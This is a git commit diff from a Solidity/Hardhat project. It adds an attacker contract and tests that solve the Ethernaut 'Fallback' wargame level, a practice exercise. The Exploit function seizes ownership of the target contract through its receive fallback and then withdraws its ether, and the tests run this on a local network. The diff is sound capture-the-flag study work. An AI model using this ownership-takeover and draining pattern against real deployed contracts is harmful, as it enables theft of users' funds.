d2df2ed3a142d14489bd961c26e578290ef8c566
keisukefunatsu <keisukeyan2012@gmail.com>
2023-02-05 11:36:50 +0000

    add test

--- basic/contracts/ethernaut/Fallback.sol
+++ basic/contracts/ethernaut/Fallback.sol
@@ -1,7 +1,31 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract Fallback {
+contract EthernautAttack {
+    EthernautFallback target;
+    address public targetAddress;
+
+    constructor(address _EthernautFallback) {
+        target = EthernautFallback(payable(_EthernautFallback));
+        targetAddress = _EthernautFallback;
+    }
+
+    function Exploit() public payable {
+        require(msg.value < 0.001 ether, "sending value must less than 0.001");
+        uint contribution = target.getContribution();
+        if (contribution == 0) {
+            target.contribute{value: msg.value}();
+        } else {
+            (bool sent, ) = payable(targetAddress).call{value: msg.value}("");
+            require(sent, "failed to send Ether");
+            target.withdraw();
+        }
+    }
+
+    receive() external payable {}
+}
+
+contract EthernautFallback {
     mapping(address => uint) public contributions;
     address public owner;
 
--- basic/test/ethernaut/Fallback.test.ts
+++ basic/test/ethernaut/Fallback.test.ts
@@ -7,14 +7,17 @@ import { ethers } from 'hardhat'
 describe('Fallback', function () {
   const deployFixture = async () => {
     const [deployer, ...signers] = await ethers.getSigners()
-    const FallbackFactory = await ethers.getContractFactory('Fallback')
+    const FallbackFactory = await ethers.getContractFactory('EthernautFallback')
     const Fallback = await FallbackFactory.connect(deployer).deploy()
     await Fallback.deployed()
-    return { Fallback, deployer, signers }
+    const AttackFactory = await ethers.getContractFactory('EthernautAttack')
+    const Attack = await AttackFactory.connect(signers[0]).deploy(Fallback.address)
+    await Attack.deployed()
+    return { Fallback, Attack, deployer, signers }
   }
 
   describe('Solution', function () {
-    it('take ownership and reduce balance', async () => {
+    it('take ownership and reduce balance by interaction', async () => {
       const { Fallback, deployer, signers } = await loadFixture(deployFixture)
       expect(await Fallback.owner()).to.equal(deployer.address)
       Fallback.connect(signers[0]).contribute({ value: parseEther("0.0009") })
@@ -25,6 +28,16 @@ describe('Fallback', function () {
       expect(await Fallback.owner()).to.equal(signers[0].address)
       await Fallback.connect(signers[0]).withdraw()
       expect(await ethers.provider.getBalance(Fallback.address)).to.equal(0)
+    })
+    it('take ownership and reduce balance by attacker contract', async () => {
+      const { Fallback, Attack, deployer, signers } = await loadFixture(deployFixture)
+      // Passes if attack successed
+      expect(await Fallback.owner()).to.equal(deployer.address)
+      await Attack.connect(signers[0]).Exploit({ value: parseEther("0.0001"), gasLimit: 5000000 })
+      await Attack.connect(signers[0]).Exploit({ value: parseEther("0.0001"), gasLimit: 5000000 })
+
+      expect(await Fallback.owner()).to.equal(Attack.address)
+      console.log(await ethers.provider.getBalance(Attack.address))
     })
   })
 })
